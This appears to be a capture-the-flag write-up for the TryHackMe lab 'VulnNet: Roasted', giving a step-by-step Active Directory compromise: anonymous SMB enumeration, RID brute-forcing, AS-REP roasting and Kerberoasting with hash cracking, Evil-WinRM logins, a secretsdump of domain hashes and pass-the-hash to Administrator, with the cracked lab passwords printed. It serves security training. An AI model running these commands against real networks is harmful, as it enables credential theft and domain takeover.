---
description: https://tryhackme.com/room/vulnnetroasted
---

# VulnNet: Roasted

## Nmap

```
sudo nmap 10.10.21.3 -p- -sS -sV     

PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-21 19:46:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Viewing the SMB shares with null authentication shows some interesting non default shares:

* VulnNet-Business-Anonymous
* VulnNet-Enterprise-Anonymous

```
smbclient -U '' -L \\\\10.10.112.34
```

![](<../../../.gitbook/assets/image (1779).png>)

We can then run the following commands to recursively download all files in the selected shares.

```bash
smbclient '\\<IP>\VulnNet-Business-Anonymous' -N -c 'prompt OFF;recurse ON; mget *' 
smbclient '\\<IP>\VulnNet-Enterprise-Anonymous' -N -c 'prompt OFF;recurse ON; mget *' 
```

![](<../../../.gitbook/assets/image (1780).png>)

Going through the downloaded documents we can see mentions of different users.

![](<../../../.gitbook/assets/image (1781).png>)

However, we would still need to know the naming context of the domain accounts. to have a chance of password spraying or attempting ASREP Roasting.

Checking for anonymous login with `Crackmapexec` shows a valid result. From here running `Crackmapexec` again with the `--rid-brute` switch enumerates the user accounts for us.

```bash
crackmapexec smb <IP> -u 'anonymous' -p '' --rid-brute | grep '(SidTypeUser)'
```

![](<../../../.gitbook/assets/image (1784).png>)

From here we have the following domain user accounts:

{% tabs %}
{% tab title="Users" %}
```bash
a-whitehat
t-skid
j-goldenhand
j-leet
```
{% endtab %}
{% endtabs %}

From here we need to identify the domain name of the Domain Controller. Running `Nmap` scripts against `LDAP` with anonymous credentials reveals some information including the domain name.

```bash
nmap -n -sV --script "ldap* and not brute" <IP>
```

![](<../../../.gitbook/assets/image (1785).png>)

Now with domain user accounts and the domain name we can take a crack at AS-REP Roasting with Impacket's GetNPuser.py.

```bash
python2 GetNPUsers.py <Domain>/ -usersfile <File> -format hashcat -outputfile <File> -dc-ip <IP>
```

![](<../../../.gitbook/assets/image (1786).png>)

Checking the output file we a hash for the user account t-skid.

![](<../../../.gitbook/assets/image (1787).png>)

We can then run `Hashcat` against this and hopefully identify the password.

```bash
hashcat -m 18200 -a 0 asrep_hashses /usr/share/wordlists/rockyou.txt  
```

`t-skid:tj072889*`&#x20;

![](<../../../.gitbook/assets/image (1788).png>)

From here I tried `WinRM` with the credentials and spraying the password and was unsuccessful in getting valid hits. I then moved onto using GetUserSPNs.py in an attempt to find service principal names associated with this domain account.

```bash
python GetUserSPNs.py <Domain>/<Username>:<Password> -dc-ip <IP> -request
```

![](<../../../.gitbook/assets/image (1789).png>)

I then used `Hashcat `again in attempt to crack this hash.

`enterprise-core-vn:ry=ibfkfv,s6h,`&#x20;

Testing these against `WinRM `with `Evil-WinRM` proves successful.

```bash
evil-winrm -i <IP> -u 'enterprise-core-vn' -p <Password>
```

![](<../../../.gitbook/assets/image (1790).png>)

For this next part we will be checking the SYSVOL folder. Instead of checking through `SMB` I will be instead be doing this on the target server directly.

Navigating to `C:\Windows\SYSVOL\sysvol `and running the following recursive `Powershell `command reveals a ResetPassword.vbs script.

```bash
*Evil-WinRM* PS C:\windows\SYSVOL\sysvol\vulnnet-rst.local> get-childitem -recurse
```

![](<../../../.gitbook/assets/image (1791).png>)

Reading the contents of this file we see that we have credentials inside the file:

![](<../../../.gitbook/assets/image (1792).png>)

Using `Evil-WinRM` we can then login as the user `a-whitehat` with the given password. To which we are an administrator as per the large amount of permissions.

![](<../../../.gitbook/assets/image (1793).png>)

From here the flag in Administrators Desktop is only accessible as SYSTEM.

![](<../../../.gitbook/assets/image (1794).png>)

From here I used the secrets dump module in `Metasploit` to attempt to access the system hashes. Using the credentials for a-whitehat this was successful.

```bash
use auxiliary/scanner/smb/impacket/secretsdump
```

![](<../../../.gitbook/assets/image (1795).png>)

From here we can log in with the Administrator NT hash using `Evil-WinRM`.

```bash
evil-winrm -i <IP> -u 'administrator' -H <Hash>
```

![](<../../../.gitbook/assets/image (1796).png>)

## Found this page helpful?

{% hint style="success" %}
If you found this page helpful to you, please rate below as per the feedback options. For any corrections or general communications, please see the root page [**Pentest Everything**](https://app.gitbook.com/@viperone/s/pentest-everything/) for contact information.
{% endhint %}
